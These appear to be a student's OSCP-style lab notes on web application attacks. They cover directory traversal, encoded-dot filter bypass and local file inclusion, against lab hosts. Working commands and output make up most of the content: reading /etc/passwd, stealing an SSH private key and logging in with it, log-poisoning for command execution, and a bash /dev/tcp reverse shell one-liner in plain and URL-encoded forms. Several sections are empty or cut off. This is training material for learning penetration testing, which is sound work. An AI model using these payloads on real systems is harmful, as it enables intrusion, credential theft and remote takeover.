
#### 9.1. Directory Traversal


###### 9.1.1. Absolute vs Relative Paths
1. Absolute Path - cat /etc/passwd
2. Relative Path - cat ../../../../etc/passwd 

*Lab Exercise* 
1. Content
2. Content

###### 9.1.2. Identifying and Exploiting Directory Traversals

1. Try to find out such link by hovering on webpage. 
```
https://example.com/cms/login.php?language=en.html
```
2. Check out etc passwd file. 
```
http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd
```
3. Find out SSH keys. 
```
http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa
```
4. Save ssh keys in new file. 
5. Establish ssh connection, flag obtained. 
```
┌──(kali㉿kali)-[~/OSCP/9]
└─$ ssh -i dt_key -p 2222 offsec@mountaindesserts.com
The authenticity of host '[mountaindesserts.com]:2222 ([192.168.226.16]:2222)' can't be established.
ED25519 key fingerprint is SHA256:EhEUVlXm/sRKDZLdE5F6w6mb8Gul5rjBcGOKqlJhClM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes    
Warning: Permanently added '[mountaindesserts.com]:2222' (ED25519) to the list of known hosts.
Linux d0d84fd8e502 5.4.0-132-generic #148-Ubuntu SMP Mon Oct 17 16:02:06 UTC 2022 x86_64
OS{a4284896cb46d505de60cfe3bae70a53}
```


*Lab Exercise*
1. Follow walkthrough. 
2. curl --path-as-is http://192.168.226.193:3000/public/plugins/mysql/../../../../../../../../Users/install.txt
 
###### 9.1.3. Encoding Special Characters
1. Checkgin directory traversal vulnerability using ../
```
┌──(kali㉿kali)-[~/OSCP/9]
└─$ curl http://192.168.226.16/cgi-bin/../../../../etc/passwd
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
</body></html>

┌──(kali㉿kali)-[~/OSCP/9]
└─$ curl http://192.168.226.16/cgi-bin/../../../../../../etc/passwd
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The request
```

2. Using encoded dots for directory transversal (Replacing . with %2e)
```
┌──(kali㉿kali)-[~/OSCP/9]
└─$ curl http://192.168.226.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
alfred:x:1000:1000::/home/alfred:/bin/bash

```

*Lab Exercise*
1. curl http://192.168.226.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/opt/passwords
2. curl --path-as-is http://192.168.226.16:3000/public/plugins/mysql/../../../../../../../../opt/install.txt


#### 9.2. File Inclusion Vulnerabilities

###### 9.2.1. Local File Inclusion (LFI)
1. Log entry of Apache's access.log
2. PHP Snippet to embed in the User Agent
3. Bash reverse shell one-liner. 
``` Reverse shell 
bash -i >& /dev/tcp/192.168.119.3/4444 0>&1
bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
```
4. Capture netcat and get reverse shell. 

*Lab Exercise*
1. www-data@f0e0b755ce98:/home/ariella$ sudo cat flag.txt
sudo cat flag.txt
OS{c3f0931fda3271808c70bbc2dfbb4e57}
2. Follow above every steps from above, Flag is on /opt/admin.bak.php page
3. Same as above steps, follow this relative pathway for burpsuite repeater. /meteor/index.php?page=../../../../../../../../../xampp/apache/logs/access.log&cmd=type%20hopefullynobodyfindsthisfilebecauseitssupersecret.txt. 


###### 9.2.2. PHP Wrappers

###### 9.2.3. Remote File Inclusion (RFI)

1. Log entry of Apa
```

```


#### 9.3. File Upload Vulnerabilities

###### 9.3.1. Using Executable Files

###### 9.3.2. Using Non-Executable Files



#### 9.4. Command Injection

###### 9.4.1. OS Command Injection



#### 9.5. Wrapping Up

